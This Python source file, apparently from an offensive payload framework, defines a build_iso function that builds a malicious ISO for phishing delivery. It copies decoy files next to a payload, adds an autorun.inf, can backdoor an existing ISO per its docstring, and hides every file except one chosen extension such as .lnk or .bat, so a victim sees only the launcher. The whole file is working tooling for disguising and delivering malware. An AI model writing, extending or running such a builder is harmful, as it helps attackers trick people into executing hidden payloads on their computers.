import pathlib
import shutil
from pycdlib import PyCdlib, pycdlibexception

REPO_ROOT = pathlib.Path(__file__).resolve().parents[2]
DEFAULT_ROOT = REPO_ROOT / "agent_code"

def build_iso(volume_id: str = "SYSTEM",
              enable_autorun: bool = True,
              source_iso: pathlib.Path = None,
              build_path: pathlib.Path = None,
              visible_extension: str = ".lnk") -> pathlib.Path:
    """
    Generates an ISO container.

    :param volume_id: ISO volume name (appears in explorer).
    :type volume_id: str
    :param enable_autorun: Include autorun.inf for auto-execution hints.
    :type enable_autorun: bool
    :param source_iso: Optional Path to an existing ISO to backdoor.
    :type source_iso: pathlib.Path
    :param build_path: The build path of the current build process.
    :type build_path: pathlib.Path
    :param visible_extension: The ONLY extension to keep visible (e.g., ".lnk", ".bat"). All others are hidden.
    :type visible_extension: str
    :return: Returns Path to the generated ISO.
    :rtype: Path
    """
    root_dir = build_path if build_path else DEFAULT_ROOT
    container_dir = root_dir / "container"
    payload_dir = root_dir / "payload"
    decoy_dir = root_dir / "decoys"

    try:
        for item in decoy_dir.rglob('*'):
            if any(part.startswith('.') for part in item.relative_to(decoy_dir).parts):
                continue

            if item.is_file():
                relative_path = item.relative_to(decoy_dir)
                target = payload_dir / relative_path
                target.parent.mkdir(parents=True, exist_ok=True)
                shutil.copy2(item, target)

        if enable_autorun:
            autorun_content = f"""[autorun]
Label={volume_id}
Icon=shell32.dll,4
"""
            autorun_path = payload_dir / "autorun.inf"
            autorun_path.write_text(autorun_content)

        if source_iso and source_iso.exists():
            output_name = source_iso.name
        else:
            output_name = "erebus.iso"

        archive_path = container_dir / "iso" / output_name
        archive_path.parent.mkdir(parents=True, exist_ok=True)
        iso = PyCdlib()
        use_rr = False
        if source_iso and source_iso.exists():
            iso.open(str(source_iso))
        else:
            iso.new(
                interchange_level=3,
                joliet=3,
                rock_ridge=None,
                vol_ident=volume_id
            )
        files_to_hide = []
        file_counter = 1

        for item in payload_dir.rglob('*'):
            if any(part.startswith('.') for part in item.relative_to(payload_dir).parts):
                continue

            if item.is_file():
                relative_path = item.relative_to(payload_dir)
                joliet_path = '/' + str(relative_path).replace('\\', '/')
                safe_ext = "".join(c for c in item.suffix.upper() if c.isalnum())[:3]
                if not safe_ext: safe_ext = "DAT"
                iso_path = f"/F{file_counter}.{safe_ext}"
                file_counter += 1

                add_args = {
                    'iso_path': iso_path,
                    'joliet_path': joliet_path
                }
                if use_rr:
                    add_args['rr_name'] = item.name

                iso.add_file(str(item), **add_args)
                if item.suffix.lower() != visible_extension.lower():
                    files_to_hide.append(joliet_path)

        for h_file in files_to_hide:
            try:
                iso.set_hidden(joliet_path=h_file)
            except pycdlibexception.PyCdlibInvalidInput:
                print(f"[!] Warning: Could not hide {h_file}")

        iso.write(str(archive_path))
        iso.close()

        return archive_path

    except Exception as e:
        raise RuntimeError(f"ISO creation failed: {e}")
